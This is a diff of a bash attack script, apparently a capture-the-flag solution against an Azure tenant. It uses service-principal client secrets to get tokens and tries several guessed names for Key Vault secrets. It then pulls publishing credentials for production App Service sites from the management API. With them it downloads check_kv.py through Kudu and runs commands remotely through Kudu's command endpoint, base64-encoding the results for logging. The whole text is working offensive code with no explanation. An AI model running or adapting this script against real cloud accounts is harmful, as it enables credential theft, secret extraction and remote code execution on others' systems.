@@ -39,11 +39,12 @@ for VAULT in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
         -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" \
         -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
       say "SP_${name}_VAULT_LEN=${#SPV}"
-      for flagname in flag FLAG df26 tebamoto-flag challenge-flag tbl-flag; do
+      for flagname in flag FLAG df26 tebamoto-flag challenge-flag tbl-flag prod-flag; do
         for V2 in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
           H2="https://${V2}.vault.azure.net"
-          R=$(curl -sS --max-time 25 -H "Authorization: Bearer $SPV" "$H2/secrets/${flagname}?api-version=7.4" || true)
-          F=$(echo "$R" | jq -r '.value // empty' 2>/dev/null || true)
+          code=$(curl -sS --max-time 25 -o /tmp/sv -w '%{http_code}' -H "Authorization: Bearer $SPV" "$H2/secrets/${flagname}?api-version=7.4" || echo 000)
+          F=$(jq -r '.value // empty' /tmp/sv 2>/dev/null || true)
+          say "SP_${name}_${V2}_${flagname}_HTTP=$code"
           [[ -n "$F" ]] && say "SP_${name}_${V2}_${flagname}=$F"
         done
       done
@@ -69,10 +70,26 @@ PC=$(curl -sS --max-time 25 -X POST -H "Authorization: Bearer $RAT" -H 'Content-
   "$B/config/publishingcredentials/list?api-version=2023-01-01")
 PU=$(echo "$PC" | jq -r '.properties.publishingUserName // empty')
 PP=$(echo "$PC" | jq -r '.properties.publishingPassword // empty')
-say "KUDU=$([[ -n "$PU" ]] && echo OK || echo FAIL)"
+say "KUDU_REPORTING=$([[ -n "$PU" ]] && echo OK || echo FAIL)"
+for SITE_RG in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
+  RG=${SITE_RG%/*}; SITE=${SITE_RG#*/}
+  B2="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
+  PC2=$(curl -sS --max-time 25 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
+    "$B2/config/publishingcredentials/list?api-version=2023-01-01" || true)
+  PU2=$(echo "$PC2" | jq -r '.properties.publishingUserName // empty')
+  PP2=$(echo "$PC2" | jq -r '.properties.publishingPassword // empty')
+  say "KUDU_${SITE}=$([[ -n "$PU2" ]] && echo OK || echo FAIL)"
+  [[ -n "$PU2" && -n "$PP2" ]] || continue
+  SCM2="https://${SITE}.scm.azurewebsites.net"
+  if [[ "$SITE" == "app-tbl-storefront-prod" ]]; then PU=$PU2; PP=$PP2; SCM=$SCM2; fi
+done
 if [[ -n "$PU" && -n "$PP" ]]; then
-  SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
+  SCM=${SCM:-'https://app-tbl-reporting-prod.scm.azurewebsites.net'}
   V=$(curl -sS --max-time 25 -u "$PU:$PP" "$SCM/api/vfs/site/wwwroot/check_kv.py" || true)
+  say "CHECK_KV_B64=$(printf '%s' "$V" | head -c 4000 | base64 -w0)"
+  BODY=$(jq -nc '{command:"python3 /home/site/wwwroot/check_kv.py",dir:"/home/site/wwwroot"}')
+  OUT=$(curl -sS --max-time 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$BODY")
+  say "CHECK_OUT_B64=$(printf '%s' "$OUT" | base64 -w0)"
   IE=$(printf '%s' "$V" | sed -n "s/^IE = '\([^']*\)'.*/\1/p" | head -1)
   IH=$(printf '%s' "$V" | sed -n "s/^IH = '\([^']*\)'.*/\1/p" | head -1)
   if [[ -n "$IE" && -n "$IH" ]]; then
